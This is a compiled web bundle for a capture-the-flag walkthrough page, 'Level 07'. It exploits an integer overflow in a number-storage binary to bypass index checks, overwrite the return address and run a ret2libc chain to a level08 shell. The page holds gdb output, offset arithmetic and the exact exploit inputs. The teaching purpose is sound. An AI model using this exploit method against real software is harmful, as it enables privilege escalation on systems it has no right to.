"use strict";(self.webpackChunkdocumentation=self.webpackChunkdocumentation||[]).push([[222],{3155:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>h,contentTitle:()=>m,default:()=>v,frontMatter:()=>u,metadata:()=>i,toc:()=>x});const i=JSON.parse('{"id":"level07","title":"\ud83e\uddc3 Level 07","description":"<MissionObjective","source":"@site/docs/level07.md","sourceDirName":".","slug":"/level07","permalink":"/docs/level07","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/level07.md","tags":[],"version":"current","sidebarPosition":8,"frontMatter":{"sidebar_position":8},"sidebar":"tutorialSidebar","previous":{"title":"\ud83e\uddea Level 06","permalink":"/docs/level06"},"next":{"title":"\ud83d\uddc2\ufe0f Level 08","permalink":"/docs/level08"}}');var t=n(4848),r=n(8453),a=n(3905),l=n(7916),d=n(8620),o=n(4700),c=n(6076);const u={sidebar_position:8},m="\ud83e\uddc3 Level 07",h={},x=[{value:"Vulnerability Analysis",id:"vulnerability-analysis",level:2},{value:"Binary Analysis",id:"binary-analysis",level:2},{value:"Available Commands:",id:"available-commands",level:3},{value:"Vulnerability Discovery",id:"vulnerability-discovery",level:2},{value:"Memory Layout Analysis",id:"memory-layout-analysis",level:2},{value:"ret2libc Preparation",id:"ret2libc-preparation",level:2},{value:"Integer Overflow Bypass",id:"integer-overflow-bypass",level:2},{value:"Live Demonstration",id:"live-demonstration",level:2},{value:"Step-by-Step Solution",id:"step-by-step-solution",level:2},{value:"Key Takeaways",id:"key-takeaways",level:2}];function p(e){const s={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(s.header,{children:(0,t.jsx)(s.h1,{id:"-level-07",children:"\ud83e\uddc3 Level 07"})}),"\n",(0,t.jsx)(l.A,{level:"Level 07",target:"level08 privileges",method:"Arbitrary memory write via integer overflow"}),"\n",(0,t.jsx)(s.h2,{id:"vulnerability-analysis",children:"Vulnerability Analysis"}),"\n",(0,t.jsx)(d.A,{type:"Integer Overflow & Arbitrary Memory Write",severity:"high",description:"The binary provides a number storage service with flawed index validation. While it restricts certain indices, unsigned integer overflow can be used to bypass these checks and write to arbitrary memory locations, including the return address on the stack.",techniques:["Integer Overflow","Return Address Overwrite","ret2libc Attack"]}),"\n",(0,t.jsx)(s.h2,{id:"binary-analysis",children:"Binary Analysis"}),"\n",(0,t.jsx)(s.p,{children:"The program presents a simple interactive CLI:"}),"\n",(0,t.jsx)(o.A,{title:"Program Interface",command:"./level07",output:"----------------------------------------------------\nWelcome to wil's crappy number storage service!   \n----------------------------------------------------\nCommands:                                          \n  store - store a number into the data storage    \n  read  - read a number from the data storage     \n  quit  - exit the program                        \n----------------------------------------------------\n wil has reserved some storage :>                 \n----------------------------------------------------"}),"\n",(0,t.jsx)(s.h3,{id:"available-commands",children:"Available Commands:"}),"\n",(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.code,{children:"store"}),": Store a number at a given index"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.code,{children:"read"}),": Read the value at a given index"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.code,{children:"quit"}),": Exit the program"]}),"\n"]}),"\n",(0,t.jsx)(s.h2,{id:"vulnerability-discovery",children:"Vulnerability Discovery"}),"\n",(0,t.jsx)(o.A,{title:"Vulnerable Code Analysis",command:"# In store_number() function:",output:'int data[100]; // global array\n\nint store_number(int *data) {\n  int number, index;\n\n  printf(" Number: ");\n  number = read_number();\n\n  printf(" Index: ");\n  index = read_number();\n\n  if ((index % 3) == 0 || index < 0 || index > 99) {\n      puts("*** ERROR! ***");\n      puts(" This index is reserved for wil!");\n      puts("*** ERROR! ***");\n      return 1;\n  }\n\n  data[index] = number;\n  return 0;\n}'}),"\n",(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.strong,{children:"Key Vulnerability:"})," Even though index bounds are partially checked, we can bypass them via ",(0,t.jsx)(s.strong,{children:"unsigned integer overflow"}),"."]}),"\n",(0,t.jsx)(s.h2,{id:"memory-layout-analysis",children:"Memory Layout Analysis"}),"\n",(0,t.jsx)(o.A,{title:"Finding data array address",command:"gdb ./level07",output:"(gdb) b read_number\n(gdb) r\nInput command: read\n\n(gdb) x/x $ebp+8\n0xffffd530: 0xffffd554"}),"\n",(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.strong,{children:"Data array location:"})," ",(0,t.jsx)(s.code,{children:"0xffffd554"})]}),"\n",(0,t.jsx)(o.A,{title:"Calculating EIP offset",command:"# Memory layout calculation",output:"EIP address: 0xffffd62c\nDATA address: 0xffffd554\nDiff: 0xffffd62c - 0xffffd554 = 0xd8 = 216 bytes\n216 / 4 = 54 (array index for EIP)"}),"\n",(0,t.jsxs)(s.p,{children:["So ",(0,t.jsx)(s.code,{children:"data[54]"})," corresponds to the saved return address (EIP)."]}),"\n",(0,t.jsx)(s.h2,{id:"ret2libc-preparation",children:"ret2libc Preparation"}),"\n",(0,t.jsx)(o.A,{title:"Finding system() and '/bin/sh' addresses",command:"gdb ./level07",output:'(gdb) info function system\n=> system() = 0xf7e6aed0\n\n(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"\n=> 0xf7f897ec'}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.strong,{children:"Addresses in decimal:"})}),"\n",(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.code,{children:"system()"}),": ",(0,t.jsx)(s.code,{children:"0xf7e6aed0"})," = ",(0,t.jsx)(s.strong,{children:"4159090384"})]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.code,{children:'"/bin/sh"'}),": ",(0,t.jsx)(s.code,{children:"0xf7f897ec"})," = ",(0,t.jsx)(s.strong,{children:"4160264172"})]}),"\n"]}),"\n",(0,t.jsx)(s.h2,{id:"integer-overflow-bypass",children:"Integer Overflow Bypass"}),"\n",(0,t.jsxs)(s.p,{children:["Index 54 is forbidden because ",(0,t.jsx)(s.code,{children:"54 % 3 == 0"}),". We use unsigned integer overflow:"]}),"\n",(0,t.jsx)(o.A,{title:"Overflow calculation",command:"# Bypass calculation",output:"To access index 54 via overflow:\nIndex = (UINT_MAX + 1) / 4 + 54 = 1073741882\n1073741882 % 3 = 0 \u274c (still forbidden)\n\nTry: (UINT_MAX + 1) / 4 + 54 + offset\n1073741938 % 3 = 1 \u2705 (allowed)\n\nIndex 1073741938 maps to data[114] in the array"}),"\n",(0,t.jsx)(s.h2,{id:"live-demonstration",children:"Live Demonstration"}),"\n",(0,t.jsx)(a.A,{src:"/level07.cast",id:"level07-exploit"}),"\n",(0,t.jsx)(s.h2,{id:"step-by-step-solution",children:"Step-by-Step Solution"}),"\n",(0,t.jsx)(c.A,{steps:[{title:"Launch the binary",description:"Start the number storage service.",command:"./level07",output:"Welcome to wil's crappy number storage service!"},{title:"Store system() address",description:"Overwrite the return address with system() using integer overflow.",command:"Input command: store\nNumber: 4159090384\nIndex: 1073741938",output:"Stored successfully"},{title:"Store '/bin/sh' argument",description:"Place the '/bin/sh' string as the first argument to system().",command:"Input command: store\nNumber: 4160264172\nIndex: 116",output:"Stored successfully"},{title:"Trigger the exploit",description:"Exit the program to execute our ret2libc chain.",command:"Input command: quit",output:"$ # Shell with level08 privileges"},{title:"Verify elevated privileges",description:"Confirm we have level08 access.",command:"whoami",output:"level08"}]}),"\n",(0,t.jsx)(s.h2,{id:"key-takeaways",children:"Key Takeaways"}),"\n",(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Integer overflow"})," can bypass index validation checks"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Array bounds checking"})," must account for unsigned integer wraparound"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"ret2libc attacks"})," don't require shellcode injection"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"Memory layout analysis"})," is crucial for calculating correct offsets"]}),"\n",(0,t.jsxs)(s.li,{children:[(0,t.jsx)(s.strong,{children:"GDB debugging"})," helps identify exact memory addresses at runtime"]}),"\n"]}),"\n",(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.strong,{children:"Tools used:"})," ",(0,t.jsx)(s.code,{children:"gdb"}),", memory layout analysis, integer overflow exploitation, ret2libc technique"]}),"\n",(0,t.jsx)(s.admonition,{title:"Important Note",type:"warning",children:(0,t.jsxs)(s.p,{children:["Memory addresses vary between sessions. Always use GDB to find the current addresses of ",(0,t.jsx)(s.code,{children:"system()"})," and ",(0,t.jsx)(s.code,{children:'"/bin/sh"'})," for your specific environment. The addresses shown here are examples from a specific debugging session."]})})]})}function v(e={}){const{wrapper:s}={...(0,r.R)(),...e.components};return s?(0,t.jsx)(s,{...e,children:(0,t.jsx)(p,{...e})}):p(e)}},3905:(e,s,n)=>{n.d(s,{A:()=>r});var i=n(6540),t=n(4848);const r=({src:e,id:s})=>{const n=(0,i.useRef)(null);return(0,i.useEffect)(()=>{const i=document.createElement("script");return i.src=e,i.id=s,i.async=!0,n.current&&n.current.appendChild(i),()=>{const e=document.getElementById(s);e&&e.remove()}},[e,s]),(0,t.jsx)("div",{ref:n})}},4700:(e,s,n)=>{n.d(s,{A:()=>x});var i=n(6540);const t="codeContainer_ZrQf",r="codeHeader_PMJ9",a="codeTitle_tp4q",l="copyButton_vymH",d="codeContent_hjih",o="commandSection_kIAe",c="prompt_g6zt",u="command_jQGV",m="output_eCt5";var h=n(4848);const x=({command:e,output:s,language:n="bash",title:x})=>{const[p,v]=(0,i.useState)(!1);return(0,h.jsxs)("div",{className:t,children:[x&&(0,h.jsxs)("div",{className:r,children:[(0,h.jsx)("span",{className:a,children:x}),(0,h.jsx)("button",{className:l,onClick:()=>{const n=e||s||"";navigator.clipboard.writeText(n),v(!0),setTimeout(()=>v(!1),2e3)},children:p?"\u2713":"Copy"})]}),(0,h.jsxs)("div",{className:d,children:[e&&(0,h.jsxs)("div",{className:o,children:[(0,h.jsx)("span",{className:c,children:"$"}),(0,h.jsx)("span",{className:u,children:e})]}),s&&(0,h.jsx)("pre",{className:m,children:s})]})]})}},6076:(e,s,n)=>{n.d(s,{A:()=>p});n(6540);const i="stepsContainer_pG2T",t="step_fonX",r="stepHeader_lANh",a="stepNumber_JMan",l="stepTitle_pSoA",d="stepDescription_I1sy",o="codeBlock_MNNe",c="commandLine_KPva",u="prompt_hyWW",m="command_dhjP",h="output_FTQu";var x=n(4848);const p=({steps:e})=>(0,x.jsx)("div",{className:i,children:e.map((e,s)=>(0,x.jsxs)("div",{className:t,children:[(0,x.jsxs)("div",{className:r,children:[(0,x.jsx)("span",{className:a,children:s+1}),(0,x.jsx)("h3",{className:l,children:e.title})]}),(0,x.jsx)("p",{className:d,children:e.description}),e.command&&(0,x.jsxs)("div",{className:o,children:[(0,x.jsxs)("div",{className:c,children:[(0,x.jsx)("span",{className:u,children:"$"}),(0,x.jsx)("code",{className:m,children:e.command})]}),e.output&&(0,x.jsx)("pre",{className:h,children:e.output})]})]},s))})},7916:(e,s,n)=>{n.d(s,{A:()=>u});n(6540);const i="missionCard_aJIf",t="missionHeader_ujCY",r="levelBadge_E6Y7",a="missionTitle_MLqA",l="missionContent_AuQf",d="missionText_YjWt",o="targetCode_IWAs";var c=n(4848);const u=({target:e,method:s,level:n})=>(0,c.jsxs)("div",{className:i,children:[(0,c.jsxs)("div",{className:t,children:[(0,c.jsx)("span",{className:r,children:n}),(0,c.jsx)("h2",{className:a,children:"Mission Objective"})]}),(0,c.jsx)("div",{className:l,children:(0,c.jsxs)("p",{className:d,children:["Gain access to user ",(0,c.jsx)("code",{className:o,children:e})," by exploiting ",s,"."]})})]})},8453:(e,s,n)=>{n.d(s,{R:()=>a,x:()=>l});var i=n(6540);const t={},r=i.createContext(t);function a(e){const s=i.useContext(r);return i.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function l(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:a(e.components),i.createElement(r.Provider,{value:s},e.children)}},8620:(e,s,n)=>{n.d(s,{A:()=>h});n(6540);const i="card_anxl",t="header_h_Kv",r="title_xshN",a="severityBadge_p8m1",l="description_LGUH",d="techniques_SXJm",o="techniquesTitle_X_0j",c="techniquesList_aLL1",u="techniqueTag_HgBs";var m=n(4848);const h=({type:e,severity:s,description:n,techniques:h})=>{const x=e=>{switch(e){case"low":return"#22c55e";case"medium":return"#f59e0b";case"high":return"#f97316";case"critical":return"#ef4444";default:return"#6b7280"}};return(0,m.jsxs)("div",{className:i,children:[(0,m.jsxs)("div",{className:t,children:[(0,m.jsx)("h3",{className:r,children:e}),(0,m.jsx)("span",{className:a,style:{backgroundColor:`${x(s)}20`,color:x(s),borderColor:`${x(s)}40`},children:s.toUpperCase()})]}),(0,m.jsx)("p",{className:l,children:n}),(0,m.jsxs)("div",{className:d,children:[(0,m.jsx)("h4",{className:o,children:"Techniques"}),(0,m.jsx)("div",{className:c,children:h.map((e,s)=>(0,m.jsx)("span",{className:u,children:e},s))})]})]})}}}]);